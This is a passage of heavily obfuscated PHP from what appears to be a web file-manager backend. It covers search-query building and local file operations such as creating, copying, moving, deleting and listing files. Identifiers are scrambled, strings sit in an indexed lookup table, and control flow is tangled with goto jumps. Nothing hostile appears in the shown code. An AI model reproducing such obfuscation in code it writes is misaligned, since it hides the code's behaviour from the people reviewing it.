$C‡ëã«•˜ò[$D»ùòí¾„£[387]] . $D»ùòí¾„£[502])); $cğòÙ•ˆõá = $this->field($D»ùòí¾„£[387])->cache(null, 600)->where($câ‡¥æ”ĞË)->count(); if ($cğòÙ•ˆõá > $c…Ôˆˆ“ÚÄ) { return $this->_listSearchChildrenNear($E¬ÉÙ ã‘©, $c…Ôˆˆ“ÚÄ); } goto dŠöõÄÊ¼‹; D½ğ‘–Ñ¢: $D»ùòí¾„£ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AÜÓòŸ·¿ = array(); $C‡ëã«•˜ò = $this->sourceInfo($E¬ÉÙ ã‘©); goto a’ì‚šœ…ì; dŠöõÄÊ¼‹: $e«²É»ˆ™Â = $this->field($D»ùòí¾„£[387])->where($câ‡¥æ”ĞË)->select(); $AÜÓòŸ·¿ = array_to_keyvalue($e«²É»ˆ™Â, $D»ùòí¾„£[33], $D»ùòí¾„£[387]); return $AÜÓòŸ·¿; goto Añ„ì‰˜†‹; Añ„ì‰˜†‹: } private function _listSearchChildrenNear($e´±Åî³‚È, $DÌîù¼ù©·) { goto B·¨ŒöŒó³; B·¨ŒöŒó³: $e×—ŒËªÂ¡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b³ñÚ÷®– = array(); $BÚï½Îˆ‚ = array($e×—ŒËªÂ¡[479] => $e´±Åî³‚È); goto E³â”¥ÌŠƒ; E³â”¥ÌŠƒ: $F†·ù±‘† = $this->field($e×—ŒËªÂ¡[1884])->where($BÚï½Îˆ‚)->select(); $câËàîÂÏ§ = array_to_keyvalue(array_filter_by_field($F†·ù±‘†, $e×—ŒËªÂ¡[388], $e×—ŒËªÂ¡[86]), $e×—ŒËªÂ¡[33], $e×—ŒËªÂ¡[387]); $b³ñÚ÷®– = array_merge($b³ñÚ÷®–, array_to_keyvalue($F†·ù±‘†, $e×—ŒËªÂ¡[33], $e×—ŒËªÂ¡[387])); goto EæåÒÏ³Ëï; B¸à¤‡íÎÀ: $b³ñÚ÷®– = array_merge($b³ñÚ÷®–, array_to_keyvalue($F†·ù±‘†, $e×—ŒËªÂ¡[33], $e×—ŒËªÂ¡[387])); $b³ñÚ÷®– = array_slice($b³ñÚ÷®–, 0, $DÌîù¼ù©·); return $b³ñÚ÷®–; goto aä¨°â¥ÚĞ; EæåÒÏ³Ëï: if (!$câËàîÂÏ§) { return $b³ñÚ÷®–; } $BÚï½Îˆ‚ = array($e×—ŒËªÂ¡[479] => array($e×—ŒËªÂ¡[7], $câËàîÂÏ§)); $F†·ù±‘† = $this->field($e×—ŒËªÂ¡[1884])->where($BÚï½Îˆ‚)->limit($DÌîù¼ù©·)->select(); goto B¸à¤‡íÎÀ; aä¨°â¥ÚĞ: } private function _listSearchBindPinyin($a¬ˆ«¶šÃ, &$Aß…¡ ßç³, &$dÒƒÁ—Š»­) { goto d³Ôôì¹Ê; d‘¶—Ûàˆ: $e˜¦§’’Üï = $Aß…¡ ßç³[$dé¢¾º³¢[28]]; unset($Aß…¡ ßç³[$dé¢¾º³¢[28]]); foreach ($Aß…¡ ßç³ as $cšÄ™…‡Íœ => $C­”ïá”£) { $fìò‘ÊËÌˆ[$dé¢¾º³¢[1886] . $cšÄ™…‡Íœ] = $C­”ïá”£; } goto C…©õ¤–´°; d³Ôôì¹Ê: $dé¢¾º³¢ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!Input::check($a¬ˆ«¶šÃ[$dé¢¾º³¢[1723]], $dé¢¾º³¢[314]) || strlen($a¬ˆ«¶šÃ[$dé¢¾º³¢[1723]]) < 2) { return; } $FÀ£§ÙƒÛ = "\114\105\106\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\151\157\137\x73\x6f\165\162\x63\x65\x5f\x6d\x65\x74\x61\40\155\x65\164\x61\40\157\x6e\40\x73\x6f\165\162\143\x65\56\x73\157\165\162\143\145\x49\104\40\x3d\x20\x6d\145\x74\141\x2e\163\x6f\x75\x72\143\x65\111\104"; goto C§Èäê½ã; C…©õ¤–´°: foreach ($e˜¦§’’Üï as $D—â†­ë¤™) { $fìò‘ÊËÌˆ[] = array($dé¢¾º³¢[1888] => $D—â†­ë¤™, $dé¢¾º³¢[909] => $dé¢¾º³¢[1727], array($dé¢¾º³¢[1889] => $D—â†­ë¤™, $dé¢¾º³¢[1890] => array($dé¢¾º³¢[7], array($dé¢¾º³¢[433], $dé¢¾º³¢[432])))); } $this->join($FÀ£§ÙƒÛ); $Aß…¡ ßç³ = $fìò‘ÊËÌˆ; goto d¬Ûíğ «„; C§Èäê½ã: $fìò‘ÊËÌˆ = array(); $dÒƒÁ—Š»­ = str_replace(array($dé¢¾º³¢[227], $dé¢¾º³¢[50], $dé¢¾º³¢[1885]), $dé¢¾º³¢[33], $dÒƒÁ—Š»­); $dÒƒÁ—Š»­ = $dé¢¾º³¢[1886] . str_replace($dé¢¾º³¢[47], $dé¢¾º³¢[1887], $dÒƒÁ—Š»­); goto d‘¶—Ûàˆ; d¬Ûíğ «„: } private function _parseSearchWhere($A‚Ç¥Œ‡‰¯) { goto aá¾ÖÙœ; cø¯Ëš­Í : if (isset($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[465]])) { $C¯Ã¬¬ÄÓ = array($b¢—ğ–â•ó[1892], $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[465]]); if ($B¼“¦õÌë¿[$b¢—ğ–â•ó[83]]) { $B¼“¦õÌë¿[$b¢—ğ–â•ó[83]] = array($B¼“¦õÌë¿[$b¢—ğ–â•ó[83]], $C¯Ã¬¬ÄÓ, $b¢—ğ–â•ó[1893]); } else { $B¼“¦õÌë¿[$b¢—ğ–â•ó[83]] = $C¯Ã¬¬ÄÓ; } } if (isset($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[1894]])) { $B¼“¦õÌë¿[$b¢—ğ–â•ó[77]] = array($b¢—ğ–â•ó[1891], $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[1894]]); } if (isset($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[1895]])) { $C¯Ã¬¬ÄÓ = array($b¢—ğ–â•ó[1892], $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[1895]]); if ($B¼“¦õÌë¿[$b¢—ğ–â•ó[77]]) { $B¼“¦õÌë¿[$b¢—ğ–â•ó[77]] = array($B¼“¦õÌë¿[$b¢—ğ–â•ó[77]], $C¯Ã¬¬ÄÓ, $b¢—ğ–â•ó[1893]); } else { $B¼“¦õÌë¿[$b¢—ğ–â•ó[77]] = $C¯Ã¬¬ÄÓ; } } goto AÇÜ„ŠĞé; fºõÔ¯Ğ„: if (isset($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[1723]]) && $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[1723]]) { $Cã¢å¶â»ù = $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[1723]]; $e×ÑŒ²µëì = explode($b¢—ğ–â•ó[50], $Cã¢å¶â»ù); if (strlen($Cã¢å¶â»ù) > 2 && (substr($Cã¢å¶â»ù, 0, 1) == $b¢—ğ–â•ó[115] && substr($Cã¢å¶â»ù, -1) == $b¢—ğ–â•ó[115]) || substr($Cã¢å¶â»ù, 0, 1) == $b¢—ğ–â•ó[55] && substr($Cã¢å¶â»ù, -1) == $b¢—ğ–â•ó[55]) { $Cã¢å¶â»ù = substr($Cã¢å¶â»ù, 1, -1); $e×ÑŒ²µëì = array($Cã¢å¶â»ù); } $B¼“¦õÌë¿[$b¢—ğ–â•ó[28]] = array(array($b¢—ğ–â•ó[501], $b¢—ğ–â•ó[1725] . $Cã¢å¶â»ù . $b¢—ğ–â•ó[1725])); if (count($e×ÑŒ²µëì) > 1) { $B¼“¦õÌë¿[$b¢—ğ–â•ó[28]] = array(); foreach ($e×ÑŒ²µëì as $Eå»¢÷¿‡Ú) { if (!trim($Eå»¢÷¿‡Ú)) { continue; } $B¼“¦õÌë¿[$b¢—ğ–â•ó[28]][] = array($b¢—ğ–â•ó[501], $b¢—ğ–â•ó[1725] . trim($Eå»¢÷¿‡Ú) . $b¢—ğ–â•ó[1725]); } } } return $B¼“¦õÌë¿; goto e´¯™Œñ’Ã; aá¾ÖÙœ: $b¢—ğ–â•ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B¼“¦õÌë¿ = array(); if (isset($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[696]])) { $B¼“¦õÌë¿[$b¢—ğ–â•ó[83]] = array($b¢—ğ–â•ó[1891], $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[696]]); } goto cø¯Ëš­Í ; AÇÜ„ŠĞé: if (isset($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[551]])) { $B¼“¦õÌë¿[] = array($b¢—ğ–â•ó[397] => $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[551]], $b¢—ğ–â•ó[396] => $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[551]], $b¢—ğ–â•ó[909] => $b¢—ğ–â•ó[1727]); } if (isset($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[390]])) { $e­Ä¾¹‚ = $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[390]]; if ($e­Ä¾¹‚ == $b¢—ğ–â•ó[76]) { $B¼“¦õÌë¿[$b¢—ğ–â•ó[388]] = 1; } else { if ($e­Ä¾¹‚ == $b¢—ğ–â•ó[1896]) { $B¼“¦õÌë¿[$b¢—ğ–â•ó[388]] = 0; } else { if ($e­Ä¾¹‚) { $e­Ä¾¹‚ = is_array($e­Ä¾¹‚) ? $e­Ä¾¹‚ : explode($b¢—ğ–â•ó[47], $e­Ä¾¹‚); $B¼“¦õÌë¿[$b¢—ğ–â•ó[390]] = array($b¢—ğ–â•ó[402], $e­Ä¾¹‚); $B¼“¦õÌë¿[$b¢—ğ–â•ó[388]] = 0; } } } } if (isset($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[479]])) { $B„¹Æó¿§ = $this->sourceInfo($A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[479]]); $B¼“¦õÌë¿[$b¢—ğ–â•ó[542]] = array($b¢—ğ–â•ó[501], $B„¹Æó¿§[$b¢—ğ–â•ó[477]] . $A‚Ç¥Œ‡‰¯[$b¢—ğ–â•ó[479]] . $b¢—ğ–â•ó[502]); } goto fºõÔ¯Ğ„; e´¯™Œñ’Ã: } } goto C–îÜµŠ ; f‰ŒàóÔ£’: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($F®„¡ôÜùì) { if (substr($F®„¡ôÜùì, 0, 2) == $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1195]) { $F®„¡ôÜùì = BASIC_PATH . substr($F®„¡ôÜùì, 2); } return $F®„¡ôÜùì; } public function iconvApp($bÒ¤ÓÉ‘ ) { $F¦Ü‚– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; global $config; return $this->iconvTo($bÒ¤ÓÉ‘ , $config[$F¦Ü‚–[1193]], $config[$F¦Ü‚–[1192]]); } public function iconvSystem($aÓ¶·î©çÏ) { $A–™Õì·Ë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; global $config; return $this->iconvTo($aÓ¶·î©çÏ, $config[$A–™Õì·Ë[1192]], $config[$A–™Õì·Ë[1193]]); } public function getPathOuter($c²±šîàÔ) { goto Bšìƒ ß¡; Bšìƒ ß¡: $AöõîœôÒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bîŒô÷ñ¤• = $this->iconvApp($this->pathBase); $c²±šîàÔ = $this->iconvApp($c²±šîàÔ); goto c—¦†¨’ô‰; bàµ ºÜ¦: $c²±šîàÔ = KodIO::clear($c²±šîàÔ); $c²±šîàÔ = substr($c²±šîàÔ, strlen($bîŒô÷ñ¤•)); if (empty($this->pathDriver)) { return $c²±šîàÔ; } goto bÀ£Š™Ï‘Ö; bÀ£Š™Ï‘Ö: return $this->pathDriver . $AöõîœôÒ[8] . ltrim($c²±šîàÔ, $AöõîœôÒ[8]); goto bàèâ¼Õ†½; c—¦†¨’ô‰: if (substr($bîŒô÷ñ¤•, 0, 2) == $AöõîœôÒ[1195]) { $bîŒô÷ñ¤• = BASIC_PATH . substr($bîŒô÷ñ¤•, 2); } if (substr($c²±šîàÔ, 0, 2) == $AöõîœôÒ[1195]) { $c²±šîàÔ = BASIC_PATH . substr($c²±šîàÔ, 2); } $bîŒô÷ñ¤• = KodIO::clear($bîŒô÷ñ¤•); goto bàµ ºÜ¦; bàèâ¼Õ†½: } public function mkfile($F£‚›Ì×÷, $cï­©Ë‘¥ = '', $Dè ÅÉ›ô¶ = REPEAT_RENAME) { $F£‚›Ì×÷ = $this->iconvSystem($F£‚›Ì×÷); @touch($F£‚›Ì×÷); if ($cï­©Ë‘¥) { file_put_contents($F£‚›Ì×÷, $cï­©Ë‘¥); } return is_file($F£‚›Ì×÷) ? $this->getPathOuter($F£‚›Ì×÷) : !1; } public function mkdir($e»ñÚ­’‰Í, $c…îâ³´Şä = REPEAT_SKIP) { $e»ñÚ­’‰Í = $this->iconvSystem($e»ñÚ­’‰Í); if (is_dir($e»ñÚ­’‰Í)) { return $this->getPathOuter($e»ñÚ­’‰Í); } @mkdir($e»ñÚ­’‰Í, 511, !0); return is_dir($e»ñÚ­’‰Í) ? $this->getPathOuter($e»ñÚ­’‰Í) : !1; } public function copyFile($b…Ã‹¬¦ß·, $EÖÓ‡Ó±º) { $this->mkdir($this->pathFather($EÖÓ‡Ó±º)); $b…Ã‹¬¦ß· = $this->iconvSystem($b…Ã‹¬¦ß·); $EÖÓ‡Ó±º = $this->iconvSystem($EÖÓ‡Ó±º); $eÎ•ªòíßÔ = copy_64($b…Ã‹¬¦ß·, $EÖÓ‡Ó±º); return $eÎ•ªòíßÔ ? $this->getPathOuter($EÖÓ‡Ó±º) : !1; } public function moveFile($FÏàö¤˜, $bæ¯ÌÓ‡) { $this->mkdir($this->pathFather($bæ¯ÌÓ‡)); $FÏàö¤˜ = $this->iconvSystem($FÏàö¤˜); $bæ¯ÌÓ‡ = $this->iconvSystem($bæ¯ÌÓ‡); $E“´ÑÎù… = intval(@rename($FÏàö¤˜, $bæ¯ÌÓ‡)); if (!$E“´ÑÎù…) { if ($E“´ÑÎù… = intval(@copy_64($FÏàö¤˜, $bæ¯ÌÓ‡))) { @unlink($FÏàö¤˜); } } return $E“´ÑÎù… ? $this->getPathOuter($bæ¯ÌÓ‡) : !1; } public function delFile($eÓËš åƒ‘) { $eÓËš åƒ‘ = $this->iconvSystem($eÓËš åƒ‘); if (!@unlink($eÓËš åƒ‘)) { @chmod($eÓËš åƒ‘, 511); if (!@unlink($eÓËš åƒ‘)) { return !1; } } else { return !0; } } public function delFolder($cğª½¸´¸á) { goto a…¹À®™šê; AÍœ”Í‡¦”: if (!($e»õ¤¾é„Ï = opendir($cğª½¸´¸á))) { return !1; } while (($FˆğäÓ°é = readdir($e»õ¤¾é„Ï)) !== !1) { if ($FˆğäÓ°é == $a“¯£†’…[94] || $FˆğäÓ°é == $a“¯£†’…[1202]) { continue; } $e¾†Š˜í¸ = $cğª½¸´¸á . $a“¯£†’…[8] . $FˆğäÓ°é; if (is_file($e¾†Š˜í¸) || is_link($e¾†Š˜í¸)) { if (!unlink($e¾†Š˜í¸)) { chmod($e¾†Š˜í¸, 511); if (!unlink($e¾†Š˜í¸)) { return !1; } } } else { if (is_dir($e¾†Š˜í¸)) { chmod($e¾†Š˜í¸, 511); $e¾†Š˜í¸ = $this->iconvApp($e¾†Š˜í¸); if (!$this->delFolder($e¾†Š˜í¸)) { return !1; } } } } closedir($e»õ¤¾é„Ï); goto c“øãèá´£; c“øãèá´£: return rmdir($cğª½¸´¸á); goto B‘‡”Ô™‚; a…¹À®™šê: $a“¯£†’… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cğª½¸´¸á = $this->iconvSystem($cğª½¸´¸á); if (!is_dir($cğª½¸´¸á)) { return !0; } goto AÍœ”Í‡¦”; B‘‡”Ô™‚: } public function rename($f™‚Ú¯‰ÊÙ, $eÆ“†ÅŠù) { goto AÊøî›–ÃÃ; DÍçå‹ˆÆŠ: $DÌÈ„é³ŒÀ = @rename($f™‚Ú¯‰ÊÙ, $C§¼ôÎ¸ä); $C§¼ôÎ¸ä = $this->iconvApp($C§¼ôÎ¸ä); return $DÌÈ„é³ŒÀ ? $this->getPathOuter($C§¼ôÎ¸ä) : !1; goto DÜ…µÉË¦; c÷‘íÚùë±: $f™‚Ú¯‰ÊÙ = $this->iconvSystem($f™‚Ú¯‰ÊÙ); $E××îÆ¼Ø¢ = $this->pathFather($f™‚Ú¯‰ÊÙ); $C§¼ôÎ¸ä = rtrim($E××îÆ¼Ø¢, $dªÍÚ†º[8]) . $dªÍÚ†º[8] . $F¦İìî¹œç; goto DÍçå‹ˆÆŠ; AÊøî›–ÃÃ: $dªÍÚ†º =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F¦İìî¹œç = $this->fileNameAuto($this->pathFather($f™‚Ú¯‰ÊÙ), $eÆ“†ÅŠù); $F¦İìî¹œç = $this->iconvSystem($F¦İìî¹œç); goto c÷‘íÚùë±; DÜ…µÉË¦: } public function size($dÜØæÁÂÃÊ) { $dÜØæÁÂÃÊ = $this->iconvSystem($dÜØæÁÂÃÊ); return filesize_64($dÜØæÁÂÃÊ); } public function info($E ¹³‚Î«š) { $E ¹³‚Î«š = $this->iconvSystem($E ¹³‚Î«š); if ($this->isFolder($E ¹³‚Î«š)) { return $this->folderInfo($E ¹³‚Î«š); } else { if ($this->isFile($E ¹³‚Î«š)) { return $this->fileInfo($E ¹³‚Î«š); } } return !1; } protected function infoChildren($EßäÆİ‚, &$AÈ‚¤„Û˜º, $b°æø‚£åù = true) { goto eíÉ‘õë²; eíÉ‘õë²: $FöÑª—ñ†Ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; check_abort_echo(); $EßäÆİ‚ = rtrim($EßäÆİ‚, $FöÑª—ñ†Ô[8]) . $FöÑª—ñ†Ô[8]; goto AÂ³İØ¯À²; AÂ³İØ¯À²: if ($b°æø‚£åù) { $EßäÆİ‚ = $this->iconvSystem($EßäÆİ‚); } if (!($eÔ»Í—Â­Í = @opendir($EßäÆİ‚))) { return; } while (($d«Öæ‰ˆŠ’ = readdir($eÔ»Í—Â­Í)) !== !1) { if ($d«Öæ‰ˆŠ’ == $FöÑª—ñ†Ô[94] || $d«Öæ‰ˆŠ’ == $FöÑª—ñ†Ô[1202]) { continue; } $F‚’µÒÎëõ = $EßäÆİ‚ . $d«Öæ‰ˆŠ’; if (is_file($F‚’µÒÎëõ) || is_link($F‚’µÒÎëõ)) { $AÈ‚¤„Û˜º[$FöÑª—ñ†Ô[78]]++; $AÈ‚¤„Û˜º[$FöÑª—ñ†Ô[77]] += filesize_64($F‚’µÒÎëõ); } else { if (is_dir($F‚’µÒÎëõ)) { $AÈ‚¤„Û˜º[$FöÑª—ñ†Ô[79]]++; $this->infoChildren($F‚’µÒÎëõ, $AÈ‚¤„Û˜º, !1); } } } goto eá¤˜İ£„º; eá¤˜İ£„º: closedir($eÔ»Í—Â­Í); goto aÁ’×ê»Æ; aÁ’×ê»Æ: } private function folderInfo($c¦õŒöÎÕ­, $e¤¨¯÷ç¾ = false) { $CÅéŒÔ­êŸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c¦õŒöÎÕ­ = rtrim($c¦õŒöÎÕ­, $CÅéŒÔ­êŸ[8]) . $CÅéŒÔ­êŸ[8]; $bßâõÏĞ = $this->iconvApp($this->pathThis($c¦õŒöÎÕ­)); if ($e¤¨¯÷ç¾) { return array($CÅéŒÔ­êŸ[28] => $bßâõÏĞ, $CÅéŒÔ­êŸ[75] => $this->getPathOuter($c¦õŒöÎÕ­), $CÅéŒÔ­êŸ[29] => $CÅéŒÔ­êŸ[76]); } $FØÀÌ÷¤†Ü = array($CÅéŒÔ­êŸ[28] => $bßâõÏĞ, $CÅéŒÔ­êŸ[75] => $this->getPathOuter($c¦õŒöÎÕ­), $CÅéŒÔ­êŸ[29] => $CÅéŒÔ­êŸ[76], $CÅéŒÔ­êŸ[192] => @filectime($c¦õŒöÎÕ­), $CÅéŒÔ­êŸ[83] => @filemtime($c¦õŒöÎÕ­), $CÅéŒÔ­êŸ[1205] => @fileatime($c¦õŒöÎÕ­), $CÅéŒÔ­êŸ[1206] => is_readable($c¦õŒöÎÕ­), $CÅéŒÔ­êŸ[1207] => is_writable($c¦õŒöÎÕ­), $CÅéŒÔ­êŸ[1208] => get_mode($c¦õŒöÎÕ­)); return $FØÀÌ÷¤†Ü; } private function fileInfo($dÇÏ®Ä¹Õ, $c÷œ½ë±á… = false) { $a‡¹­§Å† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c‚Ÿ‰Üªåê = $this->iconvApp($this->pathThis($dÇÏ®Ä¹Õ)); if ($c÷œ½ë±á…) { return array($a‡¹­§Å†[28] => $c‚Ÿ‰Üªåê, $a‡¹­§Å†[75] => $this->getPathOuter($dÇÏ®Ä¹Õ), $a‡¹­§Å†[29] => $a‡¹­§Å†[173], $a‡¹­§Å†[77] => $this->size($dÇÏ®Ä¹Õ), $a‡¹­§Å†[167] => $this->ext($c‚Ÿ‰Üªåê)); } $b©—áœá‡® = array($a‡¹­§Å†[28] => $c‚Ÿ‰Üªåê, $a‡¹­§Å†[75] => $this->getPathOuter($dÇÏ®Ä¹Õ), $a‡¹­§Å†[29] => $a‡¹­§Å†[173], $a‡¹­§Å†[192] => @filectime($dÇÏ®Ä¹Õ), $a‡¹­§Å†[83] => @filemtime($dÇÏ®Ä¹Õ), $a‡¹­§Å†[1205] => @fileatime($dÇÏ®Ä¹Õ), $a‡¹­§Å†[77] => $this->size($dÇÏ®Ä¹Õ), $a‡¹­§Å†[167] => $this->ext($c‚Ÿ‰Üªåê), $a‡¹­§Å†[1206] => is_readable($dÇÏ®Ä¹Õ), $a‡¹­§Å†[1207] => is_writable($dÇÏ®Ä¹Õ), $a‡¹­§Å†[1208] => get_mode($dÇÏ®Ä¹Õ)); return $b©—áœá‡®; } public function exist($DŸ²Ÿ£àªÑ) { $DŸ²Ÿ£àªÑ = $this->iconvSystem($DŸ²Ÿ£àªÑ); return @file_exists($DŸ²Ÿ£àªÑ); } public function isFile($fŠìÚµ¼†Ì) { $fŠìÚµ¼†Ì = $this->iconvSystem($fŠìÚµ¼†Ì); return @is_file($fŠìÚµ¼†Ì); } public function isFolder($EÇÃ„ÎÒŠÀ) { $EÇÃ„ÎÒŠÀ = $this->iconvSystem($EÇÃ„ÎÒŠÀ); return @is_dir($EÇÃ„ÎÒŠÀ); } public function listPath($FĞƒè²äƒ, $e™õê¸µ¼ç = false) { goto b¯‰”´µÚ; c¡†İ²‡øê: $bƒÛ¦…Á© = array($d”Àñ¦—ó×[74] => array(), $d”Àñ¦—ó×[73] => array()); if (!($Då¿Û‰¤£” = @opendir($FĞƒè²äƒ))) { return $bƒÛ¦…Á©; } while (($CÔÇ°è†’ = readdir($Då¿Û‰¤£”)) !== !1) { if ($CÔÇ°è†’ == $d”Àñ¦—ó×[94] || $CÔÇ°è†’ == $d”Àñ¦—ó×[1202]) { continue; } $bÓË‰†è = $FĞƒè²äƒ . $CÔÇ°è†’; if (is_file($bÓË‰†è)) { $bƒÛ¦…Á©[$d”Àñ¦—ó×[73]][] = $this->fileInfo($bÓË‰†è, $e™õê¸µ¼ç); } else { $bƒÛ¦…Á©[$d”Àñ¦—ó×[74]][] = $this->folderInfo($bÓË‰†è, $e™õê¸µ¼ç); } } goto B¸‹ÂóÄ±º; B¸‹ÂóÄ±º: closedir($Då¿Û‰¤£”); return $bƒÛ¦…Á©; goto CìÀ¯ŠøÜ; b¯‰”´µÚ: $d”Àñ¦—ó× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FĞƒè²äƒ = $this->iconvSystem($FĞƒè²äƒ); $FĞƒè²äƒ = rtrim($FĞƒè²äƒ, $d”Àñ¦—ó×[8]) . $d”Àñ¦—ó×[8]; goto c¡†İ²‡øê; CìÀ¯ŠøÜ: } public function listAll($AŒÔ†£ŒÈ, &$c’Ü²ÜéÂ = array()) { goto bœ‡ŞÒ®‰±; Cƒ’òÙª…Î: return $c’Ü²ÜéÂ; goto Cˆ„†®àª°; bœ‡ŞÒ®‰±: $c‹ÌÑ ¢àº =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AŒÔ†£ŒÈ = $this->iconvSystem($AŒÔ†£ŒÈ); $AŒÔ†£ŒÈ = rtrim($AŒÔ†£ŒÈ, $c‹ÌÑ ¢àº[8]) . $c‹ÌÑ ¢àº[8]; goto cÉ’Àê—¶É; cÉ’Àê—¶É: if (!($C¥¾†™æ = @opendir($AŒÔ†£ŒÈ))) { return $c’Ü²ÜéÂ; } while (($EÍñ”–éï = readdir($C¥¾†™æ)) !== !1) { if ($EÍñ”–éï == $c‹ÌÑ ¢àº[94] || $EÍñ”–éï == $c‹ÌÑ ¢àº[1202]) { continue; } $aµˆŸøÕäº = $AŒÔ†£ŒÈ . $EÍñ”–éï; if (is_dir($aµˆŸøÕäº) && !is_link($aµˆŸøÕäº)) { $c’Ü²ÜéÂ[] = array($c‹ÌÑ ¢àº[75] => $aµˆŸøÕäº . $c‹ÌÑ ¢àº[8], $c‹ÌÑ ¢àº[76] => 1, $c‹ÌÑ ¢àº[83] => @filemtime($aµˆŸøÕäº), $c‹ÌÑ ¢àº[77] => 0); $this->listAll($aµˆŸøÕäº, $c’Ü²ÜéÂ); } else { $c’Ü²ÜéÂ[] = array($c‹ÌÑ ¢àº[75] => $aµˆŸøÕäº, $c‹ÌÑ ¢àº[76] => 0, $c‹ÌÑ ¢àº[83] => @filemtime($aµˆŸøÕäº), $c‹ÌÑ ¢àº[77] => $this->size($aµˆŸøÕäº)); } } closedir($C¥¾†™æ); goto Cƒ’òÙª…Î; Cˆ„†®àª°: } public function has($c†ÜÓåƒœÑ, $cÊö‹”—²õ = false, $a«×Û”Ëä± = true) { goto D³ì·î°; f“¶ÛÃŒ‘®: $D„Ã·¿¨ƒ = 0; while (($A´¢Ç´¿îƒ = readdir($cÌĞâ×î¼ )) !== !1) { if ($A´¢Ç´¿îƒ == $eÁŸ™Ç¥¢í[94] || $A´¢Ç´¿îƒ == $eÁŸ™Ç¥¢í[1202]) { continue; } $CÁÔç–ÔÌˆ = $c†ÜÓåƒœÑ . $A´¢Ç´¿îƒ; if ($cÊö‹”—²õ) { $D„Ã·¿¨ƒ++; if (@is_file($CÁÔç–ÔÌˆ)) { $d²ò‹Ëå¶æ++; } else { $FÃ‚ ÕÜÛ‚++; } if ($D„Ã·¿¨ƒ > 10000) { break; } continue; } if ($a«×Û”Ëä±) { if (@is_file($CÁÔç–ÔÌˆ)) { return !0; } } else { if (@is_dir($CÁÔç–ÔÌˆ . $eÁŸ™Ç¥¢í[8])) { return !0; } } } closedir($cÌĞâ×î¼ ); goto dÃòåˆ‰»ï; dÈ¡ê¬²‹²: if (!($cÌĞâ×î¼  = @opendir($c†ÜÓåƒœÑ))) { return !1; } $d²ò‹Ëå¶æ = 0; $FÃ‚ ÕÜÛ‚ = 0; goto f“¶ÛÃŒ‘®; dÃòåˆ‰»ï: if ($cÊö‹”—²õ) { return array($eÁŸ™Ç¥¢í[201] => $d²ò‹Ëå¶æ, $eÁŸ™Ç¥¢í[202] => $FÃ‚ ÕÜÛ‚); } return !1; goto eß˜¬È¹Úù; D³ì·î°: $eÁŸ™Ç¥¢í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c†ÜÓåƒœÑ = $this->iconvSystem($c†ÜÓåƒœÑ); $c†ÜÓåƒœÑ = rtrim($c†ÜÓåƒœÑ, $eÁŸ™Ç¥¢í[8]) . $eÁŸ™Ç¥¢í[8]; goto dÈ¡ê¬²‹²; eß˜¬È¹Úù: } public function hashSimple($d›™Å‰Õ¾ç) { goto e‰îó£±ÎÙ; fŸÌõ¨í§ò: if ($BÁÒ’Ì½à÷ <= $bİ¢ßó«°¥ * $C÷Š´­¤¶) { return $this->hashMd5($d›™Å‰Õ¾ç) . $BÁÒ’Ì½à÷; } $bŒÌÙùËÑ = $eØä…µˆÊ¬[33]; $f¯İ¥ÜœŠ = intval($BÁÒ’Ì½à÷ / $C÷Š´­¤¶); goto AÖ–ôØæ; C¿Š¤ôºÛ½: return md5($bŒÌÙùËÑ) . $BÁÒ’Ì½à÷; goto DŒâ¸£¶•Ç; B×°¤Û•ñ: fseek_64($DÇôËÀ¥°, $BÁÒ’Ì½à÷ - $bİ¢ßó«°¥); $bŒÌÙùËÑ .= fread($DÇôËÀ¥°, $bİ¢ßó«°¥); fclose($DÇôËÀ¥°); goto C¿Š¤ôºÛ½; AÖ–ôØæ: $DÇôËÀ¥° = fopen($d›™Å‰Õ¾ç, $eØä…µˆÊ¬[1209]); if (!$DÇôËÀ¥°) { return $bŒÌÙùËÑ; } for ($eÏÈÂˆ»Áİ = 0; $eÏÈÂˆ»Áİ < $C÷Š´­¤¶; $eÏÈÂˆ»Áİ++) { fseek_64($DÇôËÀ¥°, $f¯İ¥ÜœŠ * $eÏÈÂˆ»Áİ); $bŒÌÙùËÑ .= fread($DÇôËÀ¥°, $bİ¢ßó«°¥); } goto B×°¤Û•ñ; e‰îó£±ÎÙ: $eØä…µˆÊ¬ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$d›™Å‰Õ¾ç) { return md5($eØä…µˆÊ¬[33]); } $d›™Å‰Õ¾ç = $this->iconvSystem($d›™Å‰Õ¾ç); goto aøÃÑ 